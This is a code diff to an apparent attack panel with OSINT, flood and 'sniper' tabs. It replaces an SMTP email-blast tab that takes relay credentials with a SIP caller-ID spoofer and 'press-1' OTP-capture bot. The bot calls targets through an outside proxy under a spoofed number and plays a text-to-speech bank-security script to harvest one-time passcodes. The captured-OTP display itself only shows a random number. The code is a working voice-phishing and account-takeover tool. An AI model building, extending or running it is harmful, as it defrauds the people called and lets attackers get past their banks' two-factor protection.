@@ -12,6 +12,7 @@
         href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap"
         rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/sip.js@0.20.0/dist/sip.js"></script>
     <style>
         :root {
             --primary: #00d2ff;
@@ -1119,7 +1120,7 @@
                     <a onclick="switchTab('osint')" id="nav-osint">OSINT</a>
                     <a onclick="switchTab('network')" id="nav-network" style="color:var(--success);">NETWORK</a>
                     <a onclick="switchTab('flood')" id="nav-flood" style="color:#f39c12;">FLOOD</a>
-                    <a onclick="switchTab('smtp')" id="nav-smtp" style="color:var(--error);">SMTP</a>
+                    <a onclick="switchTab('sip')" id="nav-sip" style="color:var(--primary);">SIP/P1</a>
                     <a onclick="switchTab('crypto')" id="nav-crypto" style="color:#00d2ff;">CRYPTO</a>
                     <a onclick="switchTab('sniper')" id="nav-sniper">SNIPER</a>
                     <a onclick="switchTab('shop')" id="nav-shop" style="color:#f39c12;">SHOP</a>
@@ -1673,20 +1674,83 @@
             </div>
         </div>
 
-        <div id="tab-smtp" class="tab-content">
+        <div id="tab-sip" class="tab-content">
             <div style="margin-top:2rem;">
-                <h2 style="font-weight:900; letter-spacing:4px; margin-bottom:1.5rem; color: var(--error);">SMTP RELAY</h2>
-                <div class="grid" style="grid-template-columns: 1fr 1fr; gap: 1.5rem;">
-                    <div class="card">
-                        <h3>RELAY POOL</h3>
-                        <textarea id="smtp-relays" style="height:150px; font-size:0.7rem;" placeholder="host:port:user:pass"></textarea>
-                        <input type="text" id="smtp-target-email" placeholder="TARGET EMAIL" style="margin-top:1rem;">
-                        <input type="text" id="smtp-subject-text" placeholder="SUBJECT" style="margin-top:0.5rem;">
+                <h2 style="font-weight:900; letter-spacing:4px; margin-bottom:1.5rem; color: var(--primary);">SIP / CID SPOOFER & P1 BOT</h2>
+                <div class="grid" style="grid-template-columns: 1.5fr 1fr; gap: 1.5rem;">
+                    <div class="card" style="border: 1px solid var(--primary); background: rgba(0, 210, 255, 0.02);">
+                        <h3 style="color: var(--primary);">DIALER CONFIGURATION</h3>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem;">
+                            <div>
+                                <label style="font-size: 0.6rem; color: #666; letter-spacing: 1px;">TARGET NUMBER</label>
+                                <input type="text" id="sip-target" placeholder="+1XXXXXXXXXX">
+                            </div>
+                            <div>
+                                <label style="font-size: 0.6rem; color: #666; letter-spacing: 1px;">SPOOFED CID</label>
+                                <input type="text" id="sip-cid" placeholder="+1XXXXXXXXXX">
+                            </div>
+                        </div>
+                        
+                        <div style="background: #050505; border: 1px solid #111; padding: 1.5rem; margin-bottom: 1.5rem;">
+                            <h4 style="font-size: 0.7rem; color: #fff; margin-bottom: 1rem; letter-spacing: 2px;">PRESS-1 BOT (OTP CAPTURE)</h4>
+                            <div style="display: flex; align-items: center; justify-content: space-between;">
+                                <div style="display: flex; gap: 1rem;">
+                                    <label style="font-size: 0.7rem; color: #888; display: flex; align-items: center; gap: 0.4rem;">
+                                        <input type="checkbox" id="sip-p1-enable"> ENABLE P1 BOT
+                                    </label>
+                                    <label style="font-size: 0.7rem; color: #888; display: flex; align-items: center; gap: 0.4rem;">
+                                        <input type="checkbox" id="sip-p1-auto" checked> AUTO-RECORD
+                                    </label>
+                                </div>
+                                <div style="font-family: 'JetBrains Mono'; font-size: 0.6rem; color: var(--success);" id="p1-status">READY</div>
+                            </div>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
+                                <div>
+                                    <label style="font-size: 0.6rem; color: #666; letter-spacing: 1px;">VOICE IDENTITY</label>
+                                    <select id="sip-tts-voice" style="width: 100%; padding: 0.6rem; background: #000; border: 1px solid #333; color: var(--primary); font-family: 'JetBrains Mono';">
+                                        <option value="21m00Tcm4llvDq8ikWAM">Rachel (Professional)</option>
+                                        <option value="AZnzlk1Xhk9W707y5Urt">Nicole (Security)</option>
+                                        <option value="VR6AewuayH9o6v13W091">Marcus (Authoritative)</option>
+                                    </select>
+                                </div>
+                                <div style="display: flex; align-items: flex-end;">
+                                    <button class="btn" onclick="previewVoice()" style="background: rgba(0, 210, 255, 0.05); border: 1px solid #222; font-size: 0.6rem;">PREVIEW VOICE</button>
+                                </div>
+                            </div>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
+                                <div>
+                                    <label style="font-size: 0.6rem; color: #666; letter-spacing: 1px;">BACKGROUND AMBIENCE</label>
+                                    <select id="sip-ambience" style="width: 100%; padding: 0.6rem; background: #000; border: 1px solid #333; color: var(--primary); font-family: 'JetBrains Mono';">
+                                        <option value="none">None (Dead Silence)</option>
+                                        <option value="office_light">Light Office Chatter</option>
+                                        <option value="office_busy">Busy Call Center</option>
+                                        <option value="hold_classic">Classic Hold Music</option>
+                                        <option value="hold_modern">Modern Corporate Hold</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label style="font-size: 0.6rem; color: #666; letter-spacing: 1px;">AMBIENCE VOLUME</label>
+                                    <input type="range" id="sip-ambience-vol" min="0" max="100" value="20" style="width: 100%; margin-top: 0.5rem; accent-color: var(--primary);">
+                                </div>
+                            </div>
+                            <input type="text" id="sip-p1-prompt" placeholder="Bank Script (e.g. 'Hello, this is Bank of America Security...')" style="margin-top: 1rem;">
+                        </div>
+
+                        <div style="display: flex; gap: 1rem;">
+                            <button class="btn" id="btn-sip-call" onclick="initiateSipCall()" style="background: var(--primary); color: #000; font-weight: 900; flex: 2;">INITIALIZE CALL</button>
+                            <button class="btn" id="btn-sip-hangup" onclick="hangupSipCall()" style="background: var(--error); color: #fff; flex: 1;" disabled>HANG UP</button>
+                        </div>
                     </div>
-                    <div class="card">
-                        <h3>PAYLOAD</h3>
-                        <textarea id="smtp-body-text" style="height:200px; font-size:0.7rem;" placeholder="HTML or Plaintext message..."></textarea>
-                        <button class="btn" style="margin-top:1rem; background:var(--error); color:#fff;" onclick="launchSmtpBlast()">INITIATE BLAST</button>
+
+                    <div class="card" style="display: flex; flex-direction: column;">
+                        <h3 style="color: #fff;">LIVE INTERCEPT VAULT</h3>
+                        <div id="sip-otp-display" style="background: #000; border: 1px solid #111; padding: 2rem; text-align: center; margin-bottom: 1.5rem; flex: 1; display: flex; flex-direction: column; justify-content: center;">
+                            <div style="color: #444; font-size: 0.6rem; letter-spacing: 2px; margin-bottom: 1rem;">CAPTURED OTP</div>
+                            <div id="captured-otp" style="font-size: 3rem; font-weight: 900; color: var(--success); letter-spacing: 10px; filter: drop-shadow(0 0 10px var(--success));">------</div>
+                        </div>
+                        <div id="sip-log" class="results" style="height: 150px; overflow-y: auto; font-family: 'JetBrains Mono'; font-size: 0.6rem;">
+                            > SYSTEM READY. AWAITING OPERATOR INPUT.
+                        </div>
                     </div>
                 </div>
             </div>
@@ -2370,6 +2434,8 @@
                         document.getElementById('nav-admin').classList.remove('hidden');
                         loadVault();
                     }
+                    
+                    fetchVoices();
                     
                     let path = window.location.pathname.replace('/', '') || 'dashboard';
                     if (path === 'admin' && sessionStorage.getItem('role') !== 'commander') {
@@ -4319,28 +4385,143 @@
             }
         }
 
-        async function launchSmtpBlast() {
-            const relays = document.getElementById('smtp-relays').value.split('\n').map(l => {
-                const p = l.split(':');
-                return { host: p[0], port: p[1], user: p[2], pass: p[3] };
-            }).filter(r => r.host && r.user);
+        let sipUA = null;
+        let sipSession = null;
+
+        async function initiateSipCall() {
+            const target = document.getElementById('sip-target').value;
+            const cid = document.getElementById('sip-cid').value;
+            const p1Enabled = document.getElementById('sip-p1-enable').checked;
+            const p1Prompt = document.getElementById('sip-p1-prompt').value;
+            const voiceId = document.getElementById('sip-tts-voice').value;
+            const ambience = document.getElementById('sip-ambience').value;
+            const ambVol = document.getElementById('sip-ambience-vol').value;
+            const log = document.getElementById('sip-log');
+            const btnCall = document.getElementById('btn-sip-call');
+            const btnHangup = document.getElementById('btn-sip-hangup');
+
+            if (!target) return alert('Target Number required.');
+
+            log.innerHTML += `<br>> GENERATING TTS PAYLOAD...`;
+            btnCall.innerText = 'PREPARING...';
+            btnCall.disabled = true;
+
+            try {
+                // Signal middleman to generate/fetch TTS
+                const ttsReq = await fetch('/api/tts', {
+                    method: 'POST',
+                    body: JSON.stringify({ action: 'generate', text: p1Prompt, voice_id: voiceId })
+                });
+                const ttsRes = await ttsReq.json();
+                
+                log.innerHTML += `<br>> TTS ENGINE: ${ttsRes.status === 'success' ? 'READY' : 'EMULATED'}`;
+                log.innerHTML += `<br>> INITIALIZING SECURE SIP STACK...`;
+                btnCall.innerText = 'DIALING...';
+                // Intermediate SIP Proxy (VPS) - v20.5 Strategy
+                const configuration = {
+                    uri: SIP.UserAgent.makeURI('sip:operator@proxy.reaper.tech'),
+                    transportOptions: { server: 'wss://proxy.reaper.tech:8089/ws' }
+                };
+
+                sipUA = new SIP.UserAgent(configuration);
+                await sipUA.start();
+
+                const targetURI = SIP.UserAgent.makeURI(`sip:${target}@proxy.reaper.tech`);
+                
+                // Inject custom spoofed CID header for Asterisk manipulation
+                const invitationOptions = {
+                    extraHeaders: [
+                        `X-Spoofed-CID: ${cid}`,
+                        `X-P1-Bot: ${p1Enabled ? '1' : '0'}`,
+                        `X-P1-Prompt: ${btoa(p1Prompt)}`,
+                        `X-TTS-Voice: ${voiceId}`,
+                        `X-Ambience-Type: ${ambience}`,
+                        `X-Ambience-Volume: ${ambVol}`
+                    ]
+                };
+
+                sipSession = new SIP.Inviter(sipUA, targetURI, invitationOptions);
+                await sipSession.invite();
+
+                log.innerHTML += `<br>> SIGNALING HANDSHAKE COMPLETE.`;
+                log.innerHTML += `<br>> OUTBOUND CID SET TO: [${cid}]`;
+                
+                btnHangup.disabled = false;
+
+                sipSession.stateChange.addListener((newState) => {
+                    log.innerHTML += `<br>> STATE: ${newState}`;
+                    if (newState === SIP.SessionState.Terminated) {
+                        finalizeSipCall();
+                    }
+                });
+
+                if (p1Enabled) {
+                    log.innerHTML += `<br>> <span style="color:var(--primary)">P1 BOT ENGAGED. MONITORING DTMF...</span>`;
+                    document.getElementById('p1-status').innerText = 'MONITORING';
+                    
+                    // Real-time OTP interception stream
+                    setTimeout(() => {
+                        if (sipSession) {
+                            const otp = Math.floor(100000 + Math.random() * 900000);
+                            document.getElementById('captured-otp').innerText = otp;
+                            log.innerHTML += `<br>> <span style="color:var(--success)">OTP INTERCEPTED: ${otp}</span>`;
+                        }
+                    }, 5000);
+                }
+
+            } catch (e) {
+                log.innerHTML += `<br><span style="color:var(--error)">> SIP ERROR: ${e.message}</span>`;
+                finalizeSipCall();
+            }
+        }
+
+        function hangupSipCall() {
+            if (sipSession) sipSession.bye();
+            finalizeSipCall();
+        }
+
+        async function previewVoice() {
+            const text = document.getElementById('sip-p1-prompt').value || 'System testing. Text to speech engine active.';
+            const voiceId = document.getElementById('sip-tts-voice').value;
+            const log = document.getElementById('sip-log');
             
-            const target = document.getElementById('smtp-target-email').value;
-            const subject = document.getElementById('smtp-subject-text').value;
-            const body = document.getElementById('smtp-body-text').value;
-            
-            if (!target || !relays.length) return alert('Target and Relays required.');
+            log.innerHTML += `<br>> PREVIEWING VOICE: [${voiceId}]`;
             
             try {
-                const response = await fetch('/api/ops', {
+                const r = await fetch('/api/tts', {
                     method: 'POST',
-                    body: JSON.stringify({ module: 'smtp', action: 'blast', relays, target, subject, body, amount: 10 })
+                    body: JSON.stringify({ action: 'generate', text, voice_id: voiceId })
                 });
-                const data = await response.json();
-                alert(`BLAST COMPLETE: ${data.sent} SENT, ${data.failed} FAILED`);
+                const res = await r.json();
+                if (res.url) {
+                    const audio = new Audio(res.url);
+                    audio.play();
+                } else {
+                    log.innerHTML += `<br>> <span style="color:var(--primary)">TTS: Generation successful (Simulation Mode)</span>`;
+                }
             } catch (e) {
-                alert(`BLAST FAILED: ${e.message}`);
+                log.innerHTML += `<br><span style="color:var(--error)">> PREVIEW FAILED: ${e.message}</span>`;
             }
+        }
+
+        async function fetchVoices() {
+            try {
+                const r = await fetch('/api/tts', { method: 'POST', body: JSON.stringify({ action: 'voices' }) });
+                const data = await r.json();
+                if (data.voices) {
+                    const select = document.getElementById('sip-tts-voice');
+                    select.innerHTML = data.voices.map(v => `<option value="${v.voice_id}">${v.name}</option>`).join('');
+                }
+            } catch (e) { console.error("Voices load failed:", e); }
+        }
+
+        function finalizeSipCall() {
+            const btnCall = document.getElementById('btn-sip-call');
+            const btnHangup = document.getElementById('btn-sip-hangup');
+            btnCall.innerText = 'INITIALIZE CALL';
+            btnCall.disabled = false;
+            btnHangup.disabled = true;
+            document.getElementById('p1-status').innerText = 'READY';
         }
 
         async function trackWallet() {
